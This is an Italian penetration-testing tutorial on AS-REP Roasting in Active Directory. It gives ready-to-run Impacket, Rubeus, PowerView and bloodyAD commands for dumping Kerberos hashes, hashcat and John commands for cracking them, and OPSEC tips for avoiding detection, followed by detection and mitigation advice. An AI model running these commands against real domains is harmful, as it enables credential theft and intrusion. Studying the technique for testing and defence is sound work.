---
title: 'AS-REP Roasting: Crackare Hash Kerberos Senza Credenziali'
slug: as-rep-roasting
description: 'AS-REP Roasting in Active Directory: estrai hash Kerberos senza credenziali e craccali offline con Impacket, Rubeus e Hashcat. Guida tecnica completa.'
image: /as-rep-roasting-active-directory.webp
draft: false
date: 2026-07-12T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - kerberos
  - as-rep roasting
---

# AS-REP Roasting in Active Directory: Estrarre e Crackare Hash Kerberos Senza Credenziali

AS-REP Roasting colpisce account Active Directory con pre-autenticazione Kerberos disabilitata. Chiunque può richiedere un AS-REP per questi account — la risposta contiene materiale cifrato con la password dell'utente, crackabile offline. A differenza del Kerberoasting, funziona anche **senza credenziali di dominio**, basta una lista di username.

***

Quando un account ha `UF_DONT_REQUIRE_PREAUTH` impostato, il Domain Controller risponde a qualsiasi richiesta AS-REQ per quell'account senza verificare l'identità del richiedente. La risposta AS-REP contiene dati cifrati con l'hash della password dell'utente — e quell'hash è crackabile offline.

Il vettore è particolarmente interessante perché non richiede foothold: se hai una lista di username validi, puoi testare tutti gli account dall'esterno del dominio. Nessuna autenticazione necessaria.

> Un account con pre-autenticazione disabilitata è un hash in attesa di essere crackato. In [Active Directory](https://hackita.it/articoli/active-directory/) questa impostazione viene spesso abilitata per compatibilità con applicazioni legacy — e dimenticata.

Classificato da MITRE ATT\&CK come [T1558.004](https://attack.mitre.org/techniques/T1558/004/).

***

## Cheat Sheet — Comandi Principali

| Scenario                                  | Comando                                                                                                                                                       |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Con credenziali → dump tutti gli hash     | `impacket-GetNPUsers corp.local/user:Pass -dc-ip <DC> -request -format hashcat -outputfile hashes.txt`                                                        |
| Con credenziali → formato john            | `impacket-GetNPUsers corp.local/user:Pass -dc-ip <DC> -request -format john`                                                                                  |
| Con hash NTLM                             | `impacket-GetNPUsers corp.local/user -hashes :NThash -dc-ip <DC> -request -format hashcat`                                                                    |
| Null session                              | `impacket-GetNPUsers 'corp.local/' -request -dc-ip <DC> -format hashcat -outputfile hashes.txt`                                                               |
| Lista utenti senza creds                  | `impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip <DC> -format hashcat`                                                                   |
| Target singolo senza creds                | `impacket-GetNPUsers corp.local/ -no-pass -dc-ip <DC> -user targetuser`                                                                                       |
| Rubeus da Windows                         | `Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /nowrap`                                                                                           |
| Rubeus target singolo                     | `Rubeus.exe asreproast /user:targetuser /format:hashcat /nowrap`                                                                                              |
| NetExec                                   | `nxc ldap <DC> -u user -p Pass --asreproast hashes.txt`                                                                                                       |
| Crack con hashcat (RC4)                   | `hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule`                                                                                 |
| Crack con hashcat (AES)                   | `hashcat -m 19800 hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule`                                                                                 |
| Crack con john                            | `john --format=krb5asrep hashes.txt --wordlist=rockyou.txt`                                                                                                   |
| Targeted: disabilita pre-auth             | `Set-DomainObject -Identity target -XOR @{useraccountcontrol=4194304}`                                                                                        |
| Targeted: ripristina valore originale UAC | `Set-DomainObject -Identity target -XOR @{useraccountcontrol=4194304}` (serve conoscere il valore UAC di partenza, l'XOR da solo non "ripristina" ciecamente) |
| dc-host (DNS only)                        | `impacket-GetNPUsers corp.local/user:Pass -dc-host DC01.corp.local -request -format hashcat`                                                                  |

***

In una normale autenticazione [Kerberos](https://hackita.it/articoli/kerberos/), il client invia un AS-REQ con un timestamp cifrato con la propria password — questo è il meccanismo di pre-autenticazione. Il DC verifica il timestamp e solo allora emette il TGT.

Con pre-autenticazione disabilitata, il DC salta questa verifica e risponde direttamente con un AS-REP contenente il TGT e una porzione cifrata con la chiave dell'utente (derivata dalla password). Chi riceve quella risposta può tentare di craccarla offline.

**Attack Flow:**

```
Enumera account con pre-autenticazione disabilitata
(con o senza credenziali di dominio)
    ↓
Richiedi AS-REP per quegli account
    ↓
Estrai l'hash dal campo enc-part della risposta
    ↓
Crack offline con Hashcat (mode 18200/19800) o John
    ↓
Password in chiaro → movimento laterale o escalation
```

***

## Prerequisiti

* Lista di username validi nel dominio (per attacco senza credenziali)
* Oppure: qualsiasi account di dominio autenticato (per enumerazione automatica)
* Raggiungibilità della porta 88 (Kerberos) del DC

***

## Step 1 — Enumerazione Account Vulnerabili

### Con credenziali — enumera tutto il dominio

```bash
# Impacket — enumera e dumpa tutti gli hash in formato hashcat
impacket-GetNPUsers corp.local/utente:Password123! -dc-ip <DC_IP> \
  -request -format hashcat -outputfile asrep_hashes.txt

# Con NT hash invece della password (pass-the-hash)
impacket-GetNPUsers corp.local/utente -hashes :NThash -dc-ip <DC_IP> \
  -request -format hashcat -outputfile asrep_hashes.txt

# Output per John invece di Hashcat
impacket-GetNPUsers corp.local/utente:Password123! -dc-ip <DC_IP> \
  -request -format john | grep "\$krb5asrep\$"

# NetExec — più veloce su ambienti grandi
nxc ldap <DC_IP> -u utente -p Password123! --asreproast asrep_hashes.txt
```

```powershell
# Rubeus da Windows — enumera e dumpa tutto
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /nowrap

# Rubeus — formato John
Rubeus.exe asreproast /format:john /outfile:hashes.txt /nowrap
```

Rubeus può eseguire l'AS-REP Roast anche da una macchina **non joined al dominio**, perché comunica direttamente con il KDC via rete — basta specificare `/domain` e `/dc`.

### Senza credenziali — null session RPC

In ambienti con null session RPC abilitata, puoi enumerare senza nessuna credenziale:

```bash
# Null session — nessun utente, nessuna password
impacket-GetNPUsers 'corp.local/' -request -dc-ip <DC_IP> \
  -format hashcat -outputfile asrep_hashes.txt
```

### Senza credenziali — lista username

Quando la null session non funziona ma hai una lista di username (da OSINT, SMTP enum, Kerbrute):

```bash
# Impacket — testa ogni username della lista senza autenticarsi
impacket-GetNPUsers corp.local/ -no-pass -usersfile usernames.txt \
  -dc-ip <DC_IP> -format hashcat -outputfile asrep_hashes.txt
```

Per costruire la lista di username prima del roast:

```bash
# Kerbrute — username enumeration senza credenziali
kerbrute userenum --dc <DC_IP> -d corp.local \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### Ambienti con DNS (dc-host invece di dc-ip)

```bash
# Utile quando il DC non risponde per IP ma risponde per hostname
impacket-GetNPUsers corp.local/utente:Password123! -dc-host DC01.corp.local \
  -request -format hashcat -outputfile asrep_hashes.txt
```

### Target singolo

```bash
# Impacket — account specifico senza creds
impacket-GetNPUsers corp.local/ -no-pass -dc-ip <DC_IP> -user targetuser \
  -format hashcat

# Rubeus — target singolo da macchina non joined al dominio
Rubeus.exe asreproast /user:targetuser /domain:corp.local /dc:<DC_IP> \
  /format:hashcat /nowrap
```

### Enumerazione via BloodHound

Se hai già una collection BloodHound del dominio, puoi trovare gli account vulnerabili direttamente via query Cypher, senza toccare il DC:

```cypher
// Tutti gli account con pre-auth disabilitata
MATCH (u:User {dontreqpreauth:true})
RETURN u.name
```

```cypher
// Solo account abilitati, con data ultima modifica password
MATCH (u:User)
WHERE u.dontreqpreauth = true AND u.enabled = true
RETURN u.name, u.pwdlastset
```

Utile per prioritizzare i target prima ancora di lanciare il roast.

***

## Step 2 — Crack Offline

L'hash AS-REP ha formato `$krb5asrep$<etype>$...`. L'etype indica il tipo di cifratura e determina la mode hashcat corretta:

```
etype 23 (RC4-HMAC)      → hashcat mode 18200 / john --format=krb5asrep
etype 17/18 (AES128/256) → hashcat mode 19800 / 19900
```

In ambienti con AES enforcement (Kerberos moderno, no RC4 legacy) l'hash non sarà `$krb5asrep$23$` — controlla sempre l'etype nell'hash prima di lanciare la mode sbagliata, altrimenti hashcat non troverà mai match.

```bash
# Hashcat — RC4 (mode 18200), wordlist base
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Hashcat — AES (mode 19800), wordlist base
hashcat -m 19800 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Hashcat — con regole (molto più efficace)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

***

## AS-REP Roasting Mirato (Targeted)

Se hai `GenericWrite` su un account utente puoi **disabilitare temporaneamente la pre-autenticazione**, estrarre l'hash, e riabilitarla — rendendo roastable qualsiasi account su cui hai write access.

```powershell
# PowerView — salva il valore UAC originale PRIMA di modificarlo
$originalUAC = (Get-DomainUser targetuser).useraccountcontrol

# Disabilita pre-auth sul target
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}

# Verifica
Get-DomainUser targetuser | Select-Object useraccountcontrol

# Esegui l'AS-REP Roast
Rubeus.exe asreproast /user:targetuser /format:hashcat /nowrap

# Riabilita pre-auth dopo il dump (XOR riporta al valore originale)
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
```

```bash
# Da Linux con bloodyAD
bloodyAD -u attacker -p 'Password123!' -d corp.local --host <DC_IP> \
  set object targetuser userAccountControl '4194304'

impacket-GetNPUsers corp.local/ -no-pass -dc-ip <DC_IP> -user targetuser

# Ripristina
bloodyAD -u attacker -p 'Password123!' -d corp.local --host <DC_IP> \
  set object targetuser userAccountControl '512'
```

Questo path è mappabile tramite [BloodHound](https://hackita.it/articoli/bloodhound/) cercando edge `GenericWrite` su oggetti utente.

***

## Differenza con Kerberoasting

|                       | AS-REP Roasting                   | Kerberoasting                     |
| --------------------- | --------------------------------- | --------------------------------- |
| Credenziali richieste | No (basta lista username)         | Sì (account di dominio)           |
| Target                | Account con pre-auth disabilitata | Account con SPN registrato        |
| Hash type             | `$krb5asrep$23$` (mode 18200)     | `$krb5tgs$23$` (mode 13100)       |
| Velocità di crack     | Più veloce (meno computazionale)  | Più lento                         |
| Configurazione target | Impostazione manuale errata       | SPN spesso necessario per servizi |

***

## OPSEC

* Le richieste AS-REP senza pre-auth non generano Event ID 4771 (che richiede pre-auth fallita) — sono richieste legittime dal punto di vista del protocollo
* Richiedi gli hash **uno alla volta con intervalli** se l'ambiente ha monitoring attivo — bulk request da un singolo IP è rilevabile
* L'attacco **senza credenziali** è ancora più difficile da correlare perché non c'è un account autenticato loggato

***

## Scenario Reale

Sei nella rete interna ma non hai ancora credenziali di dominio. Hai però una lista di username raccolta via OSINT o SMTP enumeration.

1. Lanci `impacket-GetNPUsers` in modalità no-pass con la tua lista
2. Uno degli account — `svc_legacy` — risponde con un AS-REP
3. Crachi l'hash in pochi minuti: password `Summer2023!`
4. Con quelle credenziali entri nel dominio e inizi l'enumerazione AD

Da lì puoi passare a [Kerberoasting](https://hackita.it/articoli/kerberoasting/) per espandere l'accesso verso i service account.

***

## Detection

**🔴 HIGH:**

* **Event ID 4768** con `Pre-Authentication Type: 0x0` — AS-REQ senza pre-autenticazione. È il segnale diretto dell'attacco
* Molte richieste 4768 con pre-auth type 0x0 dallo stesso IP in breve tempo

**🟡 MEDIUM:**

* Account con `UF_DONT_REQUIRE_PREAUTH` impostato — non è un evento di attacco ma una misconfiguration da eliminare
* Modifica e ripristino rapido di `userAccountControl` su un account utente (segnale di targeted AS-REP Roasting)
* **Event ID 4738** (User Account Changed) — traccia le modifiche a `userAccountControl`; sequenze rapide di disable/enable su questo campo sono il fingerprint del targeted AS-REP roasting

***

## Mitigazione

* **Abilitare la pre-autenticazione** su tutti gli account — è il default di AD, va disabilitata manualmente. Controlla periodicamente con:

```powershell
Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $true -and $_.Enabled -eq $true} | Select-Object Name
```

* **Password lunghe** (>25 caratteri) su tutti gli account di servizio — anche se roastable, il crack diventa computazionalmente improponibile
* Monitorare Event ID 4768 con pre-auth type 0x0 e generare alert immediati
* Revisitare con [BloodHound](https://hackita.it/articoli/bloodhound/) gli edge `GenericWrite` su oggetti utente per prevenire il Targeted AS-REP Roasting

***

## FAQ

**AS-REP Roasting funziona dall'esterno del dominio?**
Sì, se la porta 88 è raggiungibile e hai una lista di username. Non serve essere joined al dominio né avere credenziali valide.

**Quanto è comune trovare account con pre-auth disabilitata?**
Più di quanto si pensi. Viene spesso abilitata per compatibilità con applicazioni legacy che non supportano la pre-autenticazione Kerberos — e raramente viene monitorata o rimossa.

**Se la password è lunga il crack è impossibile?**
Non impossibile, ma altamente impraticabile. Con password casuali di 25+ caratteri e nessun pattern dizionario, il tempo di crack su GPU moderne va da anni a decenni.

***

## Conclusione

AS-REP Roasting è spesso il primo passo in un engagement dove non si hanno ancora credenziali di dominio. Un singolo account con pre-autenticazione disabilitata e password debole è sufficiente per ottenere un foothold autenticato nel dominio, da cui iniziare l'enumerazione AD completa.

La mitigazione è semplice e non richiede costi: abilitare la pre-autenticazione su tutti gli account e monitorare i 4768 con type 0x0. La difficoltà è sapere dove guardare — ed è lì che entrano in gioco audit periodici e strumenti come [BloodHound](https://hackita.it/articoli/bloodhound/).

***

**Risorse:**

* [MITRE ATT\&CK – T1558.004](https://attack.mitre.org/techniques/T1558/004/)
* [HackTricks – AS-REP Roasting](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/as-rep-roasting.html)
